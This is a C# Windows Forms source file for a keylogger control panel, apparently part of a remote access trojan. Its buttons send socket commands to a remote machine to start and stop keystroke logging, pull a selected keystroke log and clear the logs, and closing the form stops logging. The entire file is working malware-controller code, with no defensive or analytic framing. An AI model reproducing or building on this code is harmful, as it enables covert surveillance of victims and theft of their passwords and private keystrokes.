using System;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;

namespace SV
{
    public partial class Keylogger : MetroFramework.Forms.MetroForm
    {
        Socket sock;
        public string ID = "";
        public Keylogger(Socket s, string uniq)
        {
            InitializeComponent();
            ID = uniq;
            sock = s;
            button1.Click += button1_Click;
            button2.Click += button2_Click;
            button3.Click += button3_Click;
            button4.Click += button4_Click;
            metroTabControl1.SelectedIndex = 0;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            try
            {
                byte[] senddata = Form1.MyDataPacker("KEYBASLAT", Encoding.UTF8.GetBytes("ECHO"));
                sock.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                button1.Enabled = false; button2.Enabled = true;
            }
            catch (Exception) { }          
        }

        private void button2_Click(object sender, EventArgs e)
        {
            try
            {
                byte[] senddata = Form1.MyDataPacker("KEYDUR", Encoding.UTF8.GetBytes("ECHO"));
                sock.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                button1.Enabled = true; button2.Enabled = false;
            }
            catch (Exception) { }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            if (!string.IsNullOrEmpty(comboBox1.SelectedItem.ToString()) && comboBox1.SelectedItem.ToString() != "No logs.")
            {
                try
                {
                    byte[] senddata = Form1.MyDataPacker("KEYCEK", Encoding.UTF8.GetBytes(comboBox1.SelectedItem.ToString()));
                    sock.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                }
                catch (Exception) { }
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            try
            {
                byte[] senddata = Form1.MyDataPacker("LOGTEMIZLE", Encoding.UTF8.GetBytes("ECHO"));
                sock.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                comboBox1.Items.Clear();
            }
            catch (Exception) { }
        }

        private void Keylogger_FormClosing(object sender, FormClosingEventArgs e)
        {
            button2.PerformClick();
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            textBox1.SelectionStart = textBox1.Text.Length;
        }
    }
}
